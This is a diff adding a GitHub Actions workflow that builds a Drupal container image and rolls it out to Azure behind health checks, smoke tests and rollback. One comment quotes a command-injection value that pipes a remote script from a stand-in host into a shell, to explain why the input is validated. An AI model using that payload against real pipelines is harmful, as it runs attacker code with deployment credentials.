@@ -1,0 +1,449 @@
+###############################################################################
+# Build the image, then roll it out behind a health gate.
+#
+# WHAT CHANGED FROM THE PREVIOUS PIPELINE, AND WHY
+#
+# The old workflow did: composer update -> commit the lock file to main ->
+# build -> `az containerapp update` -> `az containerapp exec drush updb || echo
+# failed`. Four things were wrong with that:
+#
+#  1. It pushed a `composer update` straight to main with no review and no test,
+#    then immediately deployed it. Composer updates are exactly the change class
+#    that needs a diff and a test run. That now lives in composer-update.yml and
+#    opens a pull request.
+#  2. The traffic configuration was `latestRevision: true`, so 100% of traffic
+#    moved to the new revision the moment it was created — before any check ran.
+#    "Zero-downtime blue/green" was the label on an unguarded rollout.
+#  3. `az containerapp exec` ran the schema update, with `|| echo` swallowing the
+#    result. Schema updates now run in the container's entrypoint, where a
+#    failure prevents the revision from ever becoming healthy.
+#  4. The health check was `curl -o /dev/null -w %{http_code}`. Drupal answers a
+#    fatal error with HTTP 200 and a white screen, so that check passes on a
+#    dead site. scripts/verify-site.sh inspects the body.
+#
+# The rollout below is therefore: pin traffic -> create revision (0% traffic) ->
+# wait healthy -> smoke test via a labelled URL -> shift traffic -> verify ->
+# retire old revisions. A failure at any step leaves production on the previous
+# revision, untouched.
+###############################################################################
+
+name: Deploy
+
+on:
+  push:
+    branches: [main]
+    paths-ignore:
+      - '**.md'
+      - 'docs/**'
+      - '.gitignore'
+      - 'LICENSE'
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: "Existing image tag to deploy instead of building a new one (for a re-roll)."
+        type: string
+        required: false
+
+permissions:
+  contents: read
+  id-token: write
+
+env:
+  RESOURCE_GROUP: ${{ vars.AZURE_RESOURCE_GROUP }}
+  ACR_NAME: ${{ vars.AZURE_ACR_NAME }}
+  # AZURE_APP_NAME is the web app or the container app depending on the platform.
+  # AZURE_CONTAINER_APP_NAME is still read as a fallback so an existing
+  # deployment does not break on the rename.
+  APP_NAME: ${{ vars.AZURE_APP_NAME || vars.AZURE_CONTAINER_APP_NAME }}
+  AZURE_PLATFORM: ${{ vars.AZURE_PLATFORM || 'appservice' }}
+  IMAGE_NAME: ${{ vars.AZURE_IMAGE_NAME || 'drupal' }}
+
+concurrency:
+  # Two deploys interleaving revision creation and traffic shifts on one app is a
+  # reliable way to end up serving an untested revision. Queue, never cancel: a
+  # cancelled run can leave traffic pinned to a revision that is about to be
+  # retired.
+  group: deploy-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  build:
+    name: Build and push image
+    runs-on: ubuntu-latest
+    outputs:
+      image_tag: ${{ steps.meta.outputs.tag }}
+      revision_suffix: ${{ steps.meta.outputs.suffix }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # The mailer module is a submodule. Without this it is absent from the
+          # build context, `COPY . .` ships an image without it, and outbound
+          # mail fails at runtime rather than at build time.
+          submodules: true
+
+      - name: Resolve image tag
+        id: meta
+        env:
+          # Via the environment, never interpolated into the script. A
+          # workflow_dispatch input is attacker-controlled text as far as this
+          # runner is concerned, and `${{ ... }}` is substituted before the shell
+          # ever sees it — so a value like `x"; curl evil.sh | sh; #` would run,
+          # with this job's OIDC token and AcrPush rights available to it.
+          INPUT_IMAGE_TAG: ${{ github.event.inputs.image_tag }}
+        run: |
+          if [ -n "$INPUT_IMAGE_TAG" ]; then
+            # Constrain it as well as quoting it. This value becomes a container
+            # image tag and a revision suffix, so anything outside the character
+            # set those accept is a mistake regardless of intent.
+            case "$INPUT_IMAGE_TAG" in
+              *[!a-zA-Z0-9._-]*)
+                echo "::error::image_tag may contain only letters, digits, dot, underscore and dash."
+                exit 1 ;;
+            esac
+            tag="$INPUT_IMAGE_TAG"
+          else
+            # The commit SHA, not a timestamp. A tag has to answer "which code is
+            # this?" for a rollback to be possible, and a timestamp does not.
+            tag="${GITHUB_SHA::12}"
+          fi
+          echo "tag=$tag" >> "$GITHUB_OUTPUT"
+          # Revision suffixes must be lowercase alphanumerics and dashes, and
+          # must be unique per revision.
+          echo "suffix=r$(echo "$tag" | tr -cd 'a-z0-9' | cut -c1-12)" >> "$GITHUB_OUTPUT"
+
+      - name: Azure login (OIDC)
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+
+      - name: Skip build if the tag already exists
+        id: exists
+        run: |
+          if az acr repository show-tags --name "$ACR_NAME" --repository "$IMAGE_NAME" \
+               --query "contains(@, '${{ steps.meta.outputs.tag }}')" -o tsv 2>/dev/null | grep -qi true; then
+            echo "found=true" >> "$GITHUB_OUTPUT"
+            echo "Tag already in the registry; re-rolling the existing image."
+          else
+            echo "found=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Build and push
+        if: steps.exists.outputs.found == 'false'
+        env:
+          # Lifts the anonymous codeload.github.com rate limit. Shared runners hit
+          # it routinely and it surfaces as HTTP 429 on a random package, killing
+          # the build; scripts/composer-retry.sh is the second line of defence,
+          # not the first.
+          COMPOSER_AUTH: '{"github-oauth":{"github.com":"${{ secrets.GITHUB_TOKEN }}"}}'
+        run: |
+          set -euo pipefail
+          registry="$ACR_NAME.azurecr.io"
+          az acr login --name "$ACR_NAME"
+
+          # Warm the layer cache from the last image. Without this every deploy
+          # re-downloads ~200 composer packages, which is both slow and the main
+          # exposure to the 429s above.
+          docker pull "$registry/$IMAGE_NAME:latest" || true
+
+          # COMMIT_SHA becomes CONTAINER_VERSION in the image, which is what
+          # docker-entrypoint.sh compares against the deployed marker to decide
+          # whether this boot needs to run updb/cim/cr. An image built without it
+          # runs them on every replica start.
+          docker build \
+            --build-arg COMMIT_SHA="${{ steps.meta.outputs.tag }}" \
+            --cache-from "$registry/$IMAGE_NAME:latest" \
+            -t "$registry/$IMAGE_NAME:${{ steps.meta.outputs.tag }}" \
+            -t "$registry/$IMAGE_NAME:latest" \
+            .
+
+          docker push "$registry/$IMAGE_NAME:${{ steps.meta.outputs.tag }}"
+          docker push "$registry/$IMAGE_NAME:latest"
+
+      - name: Verify the image before it can be deployed
+        if: steps.exists.outputs.found == 'false'
+        run: ./scripts/verify-production-image.sh "$ACR_NAME.azurecr.io/$IMAGE_NAME:${{ steps.meta.outputs.tag }}"
+
+  rollout-appservice:
+    name: Rollout (App Service)
+    needs: build
+    if: vars.AZURE_PLATFORM != 'containerapps'
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Azure login (OIDC)
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+
+      - name: Record the image currently deployed
+        id: before
+        run: |
+          # Captured BEFORE anything changes, because it is the rollback target.
+          # There is no revision history on App Service to recover it from
+          # afterwards — the previous tag is only knowable if you wrote it down.
+          current=$(az webapp config show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query linuxFxVersion -o tsv | sed 's#^DOCKER|##')
+          echo "image=$current" >> "$GITHUB_OUTPUT"
+          echo "Currently deployed: $current"
+
+      - name: Point the app at the new image
+        run: |
+          az webapp config container set \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --container-image-name "$ACR_NAME.azurecr.io/$IMAGE_NAME:${{ needs.build.outputs.image_tag }}" \
+            --output none
+
+      - name: Restart and wait for the boot to finish
+        run: |
+          set -euo pipefail
+          # On B1 there is no warm swap target, so this restart IS the downtime
+          # window — and it is longer than a container start when the boot also
+          # runs schema updates. The container start time limit is set to 900s in
+          # the Bicep for exactly that reason; this poll has to outlast it.
+          #
+          # Upgrading to S1 and swapping a warmed staging slot is how to remove
+          # the window. See docs/choosing-a-platform.md.
+          az webapp restart --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" --output none
+
+          host=$(az webapp show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query defaultHostName -o tsv)
+          echo "Waiting for https://$host to answer..."
+          deadline=$(( SECONDS + 1200 ))
+          while (( SECONDS < deadline )); do
+            code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 "https://$host/nginx-health" || echo 000)
+            [[ "$code" == "200" ]] && { echo "Web server is up."; exit 0; }
+            echo "  /nginx-health -> $code"
+            sleep 15
+          done
+          echo "::error::The app did not start within 20 minutes."
+          exit 1
+
+      - name: Verify
+        id: verify
+        run: |
+          host=$(az webapp show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query defaultHostName -o tsv)
+          set +e
+          # --allow-inconclusive: from a GitHub runner an IP-restricted app answers
+          # from Azure's front end with no application headers, which verify-site.sh
+          # correctly refuses to call a pass. See the Container Apps job for the
+          # full reasoning; the consequence is the same — on a restricted site this
+          # step verifies nothing beyond reachability.
+          ./scripts/verify-site.sh "https://$host" --allow-inconclusive
+          echo "rc=$?" >> "$GITHUB_OUTPUT"
+          exit 0
+
+      - name: Read the boot result
+        run: |
+          # The entrypoint writes a per-step exit code and a fingerprint of each
+          # secret to /home/boot-result.json. Surfacing it here means a degraded
+          # boot — a tolerated step that failed — is visible in the deploy log
+          # rather than only discoverable later.
+          token=$(az account get-access-token --query accessToken -o tsv)
+          curl -fsS -H "Authorization: Bearer $token" \
+            "https://${APP_NAME}.scm.azurewebsites.net/api/vfs/home/boot-result.json" \
+            | python3 -m json.tool || echo "(no boot result yet)"
+
+      - name: Roll back if verification failed
+        if: steps.verify.outputs.rc != '0' && steps.before.outputs.image != ''
+        run: |
+          echo "::warning::Repointing at ${{ steps.before.outputs.image }}"
+          az webapp config container set \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --container-image-name "${{ steps.before.outputs.image }}" --output none
+          az webapp restart --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" --output none
+          exit 1
+
+      - name: Fail the run if verification failed
+        if: steps.verify.outputs.rc != '0'
+        run: exit 1
+
+  rollout-containerapps:
+    name: Gated rollout (Container Apps)
+    needs: build
+    if: vars.AZURE_PLATFORM == 'containerapps'
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Azure login (OIDC)
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+
+      - name: Install the containerapp CLI extension
+        run: az extension add --name containerapp --upgrade --only-show-errors
+
+      - name: Pin traffic to the currently live revision
+        id: pin
+        run: |
+          set -euo pipefail
+          # Before creating a new revision, make the CURRENT one the explicit
+          # traffic target. The app ships with `latestRevision: true` so that a
+          # first-ever deployment has somewhere to send traffic; leaving it that
+          # way means every subsequent revision takes 100% of traffic the instant
+          # it is created, which defeats the whole gate.
+          current=$(az containerapp revision list \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query "[?properties.active && properties.trafficWeight > \`0\`] | [0].name" -o tsv)
+
+          if [ -z "$current" ] || [ "$current" = "null" ]; then
+            current=$(az containerapp revision list \
+              --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+              --query "sort_by([?properties.active], &properties.createdTime)[-1].name" -o tsv)
+          fi
+
+          if [ -z "$current" ] || [ "$current" = "null" ]; then
+            echo "No active revision — this is a first deployment. Traffic will follow the new revision."
+            echo "previous=" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          echo "Pinning 100% of traffic to $current"
+          az containerapp ingress traffic set \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --revision-weight "$current=100" --only-show-errors >/dev/null
+          echo "previous=$current" >> "$GITHUB_OUTPUT"
+
+      - name: Create the new revision
+        id: create
+        run: |
+          set -euo pipefail
+          registry="$ACR_NAME.azurecr.io"
+          az containerapp update \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --image "$registry/$IMAGE_NAME:${{ needs.build.outputs.image_tag }}" \
+            --revision-suffix "${{ needs.build.outputs.revision_suffix }}" \
+            --only-show-errors >/dev/null
+          echo "revision=${APP_NAME}--${{ needs.build.outputs.revision_suffix }}" >> "$GITHUB_OUTPUT"
+
+      - name: Wait for the revision to become healthy
+        id: wait
+        run: |
+          set -euo pipefail
+          rev="${{ steps.create.outputs.revision }}"
+          # Generous, because the entrypoint runs `drush updb` and
+          # `config:import` before the container starts listening. The startup
+          # probe budget in infra/modules/aca.bicep is 900s; allow for that plus
+          # image pull.
+          deadline=$(( SECONDS + 1200 ))
+          while (( SECONDS < deadline )); do
+            read -r running health <<<"$(az containerapp revision show \
+              --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" --revision "$rev" \
+              --query "[properties.runningState, properties.healthState]" -o tsv || echo "Unknown Unknown")"
+            echo "  runningState=$running healthState=$health"
+            case "$running" in
+              Running)
+                echo "Revision is running."
+                exit 0
+                ;;
+              Failed|Degraded)
+                echo "::error::Revision $rev reached $running. Traffic was never shifted; production is untouched."
+                az containerapp logs show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+                  --revision "$rev" --tail 200 --type console || true
+                exit 1
+                ;;
+            esac
+            sleep 15
+          done
+          echo "::error::Revision $rev did not reach Running within 20 minutes."
+          az containerapp logs show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --revision "$rev" --tail 200 --type console || true
+          exit 1
+
+      - name: Smoke test the new revision before it receives traffic
+        run: |
+          set -euo pipefail
+          rev="${{ steps.create.outputs.revision }}"
+          # A revision label gives the revision its own FQDN, which is the only
+          # way to send a request to a specific revision that is holding 0% of
+          # traffic. Without it there is no way to test before shifting.
+          az containerapp revision label add \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --revision "$rev" --label candidate --no-prompt --only-show-errors >/dev/null || true
+
+          domain=$(az containerapp show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query "properties.configuration.ingress.fqdn" -o tsv)
+          # Labelled revision FQDNs are <app>---<label>.<env-domain>.
+          candidate="${APP_NAME}---candidate.${domain#*.}"
+          echo "Testing https://$candidate"
+
+          # --allow-inconclusive, and this needs saying out loud.
+          #
+          # verify-site.sh exits 2 when the request never reached the container —
+          # which is what happens from a GitHub runner if the app has an ingress
+          # allow-list, because Azure's front end answers with no application
+          # headers. That is not a pass and the script refuses to call it one.
+          #
+          # Failing the deploy on it would make every deploy to an
+          # access-restricted site red, so the flag downgrades exit 2 to 0. The
+          # consequence is real and worth knowing: on such a site this step
+          # verifies nothing, and the rollout is gated only on the revision
+          # becoming healthy — which the startup probe and the entrypoint's exit
+          # code already establish. To get a genuine check, add the runner's
+          # egress range to the allow-list, or run verify-site.sh from inside it.
+          set +e
+          ./scripts/verify-site.sh "https://$candidate" --allow-inconclusive
+          rc=$?
+          set -e
+          if (( rc != 0 )); then
+            echo "::error::The candidate revision failed its smoke test. Traffic was never shifted; production is untouched."
+            exit 1
+          fi
+
+      - name: Shift traffic
+        run: |
+          set -euo pipefail
+          az containerapp ingress traffic set \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --revision-weight "${{ steps.create.outputs.revision }}=100" --only-show-errors >/dev/null
+          echo "Traffic now on ${{ steps.create.outputs.revision }}"
+
+      - name: Verify production
+        run: |
+          fqdn=$(az containerapp show --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query "properties.configuration.ingress.fqdn" -o tsv)
+          set +e
+          ./scripts/verify-site.sh "https://$fqdn" --allow-inconclusive
+          rc=$?
+          set -e
+          # Exit 2 became 0 above. Only a real FAIL — the application answered
+          # and something was wrong — triggers the rollback step below.
+          exit $rc
+
+      - name: Roll back if production verification failed
+        if: failure() && steps.pin.outputs.previous != ''
+        run: |
+          echo "::warning::Shifting traffic back to ${{ steps.pin.outputs.previous }}"
+          az containerapp ingress traffic set \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --revision-weight "${{ steps.pin.outputs.previous }}=100" --only-show-errors >/dev/null
+
+      - name: Retire superseded revisions
+        if: success()
+        run: |
+          set -euo pipefail
+          # Keep the last few for rollback; deactivate the rest. In Multiple
+          # revisions mode nothing does this automatically, and an inactive
+          # revision still counts against the environment's subnet addresses and
+          # the app's revision limit — a long-running app eventually refuses to
+          # create new revisions with an error that names neither cause.
+          keep=3
+          az containerapp revision list \
+            --name "$APP_NAME" --resource-group "$RESOURCE_GROUP" \
+            --query "sort_by([?properties.active && properties.trafficWeight == \`0\`], &properties.createdTime)[:-${keep}].name" -o tsv \
+            | while read -r old; do
+                [ -n "$old" ] || continue
+                echo "Deactivating $old"
+                az containerapp revision deactivate --name "$APP_NAME" \
+                  --resource-group "$RESOURCE_GROUP" --revision "$old" --only-show-errors || true
+              done
